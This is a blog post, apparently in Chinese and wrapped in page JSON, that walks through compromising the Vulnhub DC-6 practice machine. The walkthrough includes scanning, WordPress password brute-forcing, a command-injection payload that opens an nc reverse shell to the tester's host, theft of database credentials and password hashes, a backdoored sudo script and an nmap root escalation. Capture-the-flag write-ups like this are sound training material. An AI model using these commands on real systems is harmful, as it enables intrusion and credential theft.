{"pageProps":{"postData":{"id":"VulnhubDC-6","contentHtml":"<h1>DC-6</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-6,315/\">https://www.vulnhub.com/entry/dc-6,315/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>177</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-02 22:39 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00021</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00019</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.177</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00013</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:C7:D5:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FE:CA:<span class=\"hljs-number\">7</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>扫描靶机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.177</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-02 22:39 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.177</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0013</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:C7:D5:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p80,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.177</span>     \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-02 22:40 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.177</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00038</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">7.4</span>p1 Debian <span class=\"hljs-number\">10</span>+<span class=\"hljs-title function_ invoke__\">deb9u6</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">25</span> ((Debian))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:C7:D5:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.177</span>\n//\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-02 <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">41</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.177</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00026</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n| http-wordpress-users: \n| Username found: admin\n| Username found: graham\n| Username found: mark\n| Username found: sarah\n| Username found: jens\n|_Search stopped at ID #25. Increase the upper limit if necessary with '</span>http-wordpress-users.limit<span class=\"hljs-string\">'\n| http-enum: \n|   /wp-login.php: Possible admin folder\n|   /readme.html: Wordpress version: 2 \n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n|   /wp-login.php: Wordpress login page.\n|   /wp-admin/upgrade.php: Wordpress login page.\n|_  /readme.html: Interesting, a readme.\nMAC Address: 00:0C:29:C7:D5:F4 (VMware)\n</span></code></pre>\n<p>网站CMS是<code>wordpress</code> ，并且找到了几个用户名，其中包括<code>admin</code></p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>话不多说，先用<code>wpscan</code>扫描一波</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># wpscan -e u --url http://wordy         </span>\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | <span class=\"hljs-string\">'_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://wordy/ [192.168.75.177]\n[+] Started: Sat Nov  2 22:45:10 2024\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.25 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://wordy/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).\n | Found By: Rss Generator (Passive Detection)\n |  - http://wordy/index.php/feed/, &#x3C;generator>https://wordpress.org/?v=5.1.1&#x3C;/generator>\n |  - http://wordy/index.php/comments/feed/, &#x3C;generator>https://wordpress.org/?v=5.1.1&#x3C;/generator>\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://wordy/wp-content/themes/twentyseventeen/\n | Last Updated: 2024-07-16T00:00:00.000Z\n | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt\n | [!] The version is out of date, the latest version is 3.7\n | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: '</span>Version: <span class=\"hljs-number\">2.1</span><span class=\"hljs-string\">'\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 &#x3C;====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By:\n |  Wp Json Api (Aggressive Detection)\n |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&#x26;page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] graham\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] mark\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] sarah\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] jens\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n</span></code></pre>\n</li>\n<li>\n<p>扫描目录，也没什么实质性有用的</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.177</span> -x <span class=\"hljs-number\">403</span>                             \n//                                                                                                                                                                                   \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">404</span> -   51KB - /index.php/login/                                 \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -   18KB - /index.php                                        \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">200</span> -    7KB - /license.txt                                      \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">28</span>] <span class=\"hljs-number\">200</span> -    3KB - /readme.html                                      \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">301</span> -  319B  - /wp-admin  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.177</span>/wp-admin/    \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">500</span> -    3KB - /wp-admin/setup-config.php                        \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">400</span> -    1B  - /wp-admin/admin-ajax.php                          \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">302</span> -    0B  - /wp-admin/  ->  http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.177</span>%2Fwp-admin%2F&#x26;reauth=<span class=\"hljs-number\">1</span>\n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">200</span> -    0B  - /wp-config.php\n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">200</span> -  517B  - /wp-admin/install.php                             \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">200</span> -    0B  - /wp-content/                                      \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">301</span> -  321B  - /wp-content  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.177</span>/wp-content/\n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">500</span> -    0B  - /wp-content/plugins/hello.php                     \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">301</span> -  322B  - /wp-includes  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.177</span>/wp-includes/\n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">500</span> -    0B  - /wp-includes/rss-functions.php                    \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -    0B  - /wp-cron.php                                      \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -    1KB - /wp-login.php\n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">302</span> -    0B  - /wp-signup.php  ->  http://wordy/wp-login.php?action=register\n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -    4KB - /wp-includes/                                     \n[<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">405</span> -   42B  - /xmlrpc.php \n</code></pre>\n</li>\n<li>\n<p>尝试爆破用户但是没成功（使用<code>cewl</code>生成字典然后再通过<code>John</code>拓展字典），然后本想着用<code>rockyou</code>字典给五个用户直接爆破的，但是结果需要<code>71721960</code> 次请求，最后发现作者其实给了提示：</p>\n<pre><code class=\"hljs language-python\">OK, this isn<span class=\"hljs-string\">'t really a clue as such, but more of some \"we don'</span>t want to spend five years waiting <span class=\"hljs-keyword\">for</span> a certain process to finish<span class=\"hljs-string\">\" kind of advice for those who just want to get on with the job.\n\ncat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-)\n</span></code></pre>\n<p>好家伙，我们去尝试尝试</p>\n<pre><code class=\"hljs language-python\">cat /usr/share/wordlists/rockyou.txt | grep k01 > passwd\n</code></pre>\n<p>然后接着使用<code>wpscan</code>爆破，<code>wordy-uname</code>的内容是枚举出来的那几个用户</p>\n<pre><code class=\"hljs language-python\">wpscan --url http://wordy --usernames wordy-uname --passwords passwd\n//\n[!] Valid Combinations Found:\n | Username: mark, Password: helpdesk01\n</code></pre>\n<p>爆破出了用户<code>mark</code>的密码<code>helpdesk01</code></p>\n</li>\n</ol>\n<h2>后台利用</h2>\n<ol>\n<li>\n<p>登陆后台，无死角寻找可利用的点，在<code>Activity Monitor</code>发现个奇怪的点</p>\n<p><img src=\"/post-images/VulnhubDC-6/image34.png\" alt=\"image.png\"></p>\n<p>网上查阅漏洞，发现只要输入 <code>ip | command</code> 即可执行命令，比如输入 <code>127.0.0.1 | ls</code> 再点击<code>lookup</code> ,就会执行<code>ls</code>命令</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-02 <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">34</span>\n\nThe IP address <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span> | ls resolves to .\n\nOutput <span class=\"hljs-keyword\">from</span> dig:\n\nabout.php\nadmin-ajax.php\nadmin-footer.php\n\n.....\n\nuser-edit.php\nuser-new.php\nusers.php\nwidgets.php\n</code></pre>\n</li>\n<li>\n<p>本来想着直接输入反弹<code>shell</code>命令但是发现有长度限制，我们输入<code>127.0.0.1 | ls</code> 抓包看看</p>\n<pre><code class=\"hljs language-python\">-----------------------------<span class=\"hljs-number\">129755843329691969431898324683</span>\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"ip\"</span>\n\n<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span> | ls\n-----------------------------<span class=\"hljs-number\">129755843329691969431898324683</span>\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"lookup\"</span>\n\nLookup\n-----------------------------<span class=\"hljs-number\">129755843329691969431898324683</span>--\n</code></pre>\n<p>我们将<code>ls</code>改为别的命令测试，返回结果显示</p>\n<p><img src=\"/post-images/VulnhubDC-6/image35.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>我们将命令改为反弹<code>shell</code>命令，同时<code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">-----------------------------<span class=\"hljs-number\">129755843329691969431898324683</span>\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"ip\"</span>\n\n<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span> | nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> <span class=\"hljs-number\">1234</span> -e /<span class=\"hljs-built_in\">bin</span>/bash\n-----------------------------<span class=\"hljs-number\">129755843329691969431898324683</span>\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"lookup\"</span>\n\nLookup\n-----------------------------<span class=\"hljs-number\">129755843329691969431898324683</span>--\n</code></pre>\n<p>获得<code>shell</code></p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">$ whoami\nwww-data\n$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n$ uname -a\nLinux dc-<span class=\"hljs-number\">6</span> <span class=\"hljs-number\">4.9</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">8</span>-amd64 <span class=\"hljs-comment\">#1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p>在wp-admin.php下存在数据库账号密码<code>wpdbuser</code>，<code>meErKatZ</code></p>\n<pre><code class=\"hljs language-python\">define( <span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'wpdbuser'</span> );\n\n/** MySQL database password */\ndefine( <span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'meErKatZ'</span> );\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>登录数据库发现是<code>MariaDB</code> ，尝试查找有用数据，查看用户表</p>\n<pre><code class=\"hljs language-python\">select * <span class=\"hljs-keyword\">from</span> wp_users;\n+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+\n| ID | user_login | user_pass                          | user_nicename | user_email                  | user_url | user_registered     | user_activation_key                           | user_status | display_name    |\n+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+\n|  <span class=\"hljs-number\">1</span> | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         | blah@blahblahblah1.net.au   |          | <span class=\"hljs-number\">2019</span>-04-<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">10</span> | <span class=\"hljs-number\">1730559782</span>:$P$BKYxKh8422wMLCjdKGb5OIG7VWZZX3/ |           <span class=\"hljs-number\">0</span> | admin           |\n|  <span class=\"hljs-number\">2</span> | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        | graham@blahblahblah1.net.au |          | <span class=\"hljs-number\">2019</span>-04-<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">57</span> |                                               |           <span class=\"hljs-number\">0</span> | Graham Bond     |\n|  <span class=\"hljs-number\">3</span> | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          | mark@blahblahblah1.net.au   |          | <span class=\"hljs-number\">2019</span>-04-<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">55</span>:<span class=\"hljs-number\">39</span> |                                               |           <span class=\"hljs-number\">0</span> | Mark Jones      |\n|  <span class=\"hljs-number\">4</span> | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx<span class=\"hljs-number\">.3</span>/ | sarah         | sarah@blahblahblah1.net.au  |          | <span class=\"hljs-number\">2019</span>-04-<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">56</span>:<span class=\"hljs-number\">10</span> |                                               |           <span class=\"hljs-number\">0</span> | Sarah Balin     |\n|  <span class=\"hljs-number\">5</span> | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          | jens@blahblahblah1.net.au   |          | <span class=\"hljs-number\">2019</span>-04-<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">13</span>:04:<span class=\"hljs-number\">40</span> | <span class=\"hljs-number\">1556111080</span>:$P$B5/.DwEMzMFh3bvoGjPgnFO0Qtd3p./ |           <span class=\"hljs-number\">0</span> | Jens Dagmeister |\n+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+\n</code></pre>\n</li>\n<li>\n<p>使用<code>john</code>爆破，好久了都没出来，寻找别的线索</p>\n</li>\n<li>\n<p>发现mark用户的加目录下存在<code>things-to-do.txt</code> ，里面有<code>graham</code>用户的账号密码，尝试<code>ssh</code>登录，成功进入</p>\n<pre><code class=\"hljs language-python\">$ cat things-to-do.txt\n//\nThings to do:\n\n- Restore full functionality <span class=\"hljs-keyword\">for</span> the hyperdrive (need to speak to Jens)\n- Buy present <span class=\"hljs-keyword\">for</span> Sarah<span class=\"hljs-string\">'s farewell party\n- Add new user: graham - GSo7isUM1D4 - done\n- Apply for the OSCP course\n- Buy new laptop for Sarah'</span>s replacement\n</code></pre>\n</li>\n<li>\n<p>查看权限，可以使用<code>jens</code>用户执行<code>backups.sh</code>脚本</p>\n<pre><code class=\"hljs language-python\">graham@dc-<span class=\"hljs-number\">6</span>:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> graham on dc-<span class=\"hljs-number\">6</span>:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser graham may run the following commands on dc-<span class=\"hljs-number\">6</span>:\n    (jens) NOPASSWD: /home/jens/backups.sh\n</code></pre>\n</li>\n<li>\n<p>查看脚本内容，就是备份网站内容</p>\n<pre><code class=\"hljs language-python\">graham@dc-<span class=\"hljs-number\">6</span>:/home/jens$ cat backups.sh \n//\n<span class=\"hljs-comment\">#!/bin/bash</span>\ntar -czf backups.tar.gz /var/www/html\n</code></pre>\n</li>\n<li>\n<p>我们将反弹<code>shell</code>语句追加到文件尾部，然后运行</p>\n<pre><code class=\"hljs language-python\">echo nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> <span class=\"hljs-number\">1234</span> -e /<span class=\"hljs-built_in\">bin</span>/bash >> backups.sh\n</code></pre>\n<p>注意kali记得先开启监听</p>\n<pre><code class=\"hljs language-python\">sudo -u jens /home/jens/backups.sh\n</code></pre>\n<p>获得新的用户<code>shell</code>，用户是<code>jens</code></p>\n<pre><code class=\"hljs language-python\">whoami\njens\n</code></pre>\n</li>\n<li>\n<p>查看权限，存在<code>root</code>权限的<code>nmap</code> ，可以进行提权了</p>\n<pre><code class=\"hljs language-python\">jens@dc-<span class=\"hljs-number\">6</span>:/var$ sudo -l\nsudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> jens on dc-<span class=\"hljs-number\">6</span>:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser jens may run the following commands on dc-<span class=\"hljs-number\">6</span>:\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/nmap\n</code></pre>\n</li>\n<li>\n<p><code>nmap</code>提权</p>\n<ul>\n<li>\n<p>编写提权脚本</p>\n<pre><code class=\"hljs language-python\">$ echo <span class=\"hljs-string\">\"os.execute('/bin/sh')\"</span> > getshell.nse\n</code></pre>\n</li>\n<li>\n<p><code>nmap</code>执行脚本，获得root权限</p>\n<pre><code class=\"hljs language-python\">$ sudo nmap --script=getshell.nse\n\n<span class=\"hljs-comment\">#</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># cat theflag.txt</span>\n\nYb        dP <span class=\"hljs-number\">888888</span> <span class=\"hljs-number\">88</span>     <span class=\"hljs-number\">88</span>         8888b.   dP<span class=\"hljs-string\">\"Yb  88b 88 888888 d8b \n Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P \n  YbdPYbdP   88\"</span><span class=\"hljs-string\">\"   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88\"</span><span class=\"hljs-string\">\"   `\"</span><span class=\"hljs-string\">' \n   YP  YP    888888 88ood8 88ood8     8888Y\"   YbodP  88  Y8 888888 (8) \n\nCongratulations!!!\n\nHope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those\nwho have provided feedback, and who have taken time to complete these little\nchallenges.\n\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n</span></code></pre>\n</li>\n</ol>","title":"Vulnhub - DC-6","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"},"recentPosts":[{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - 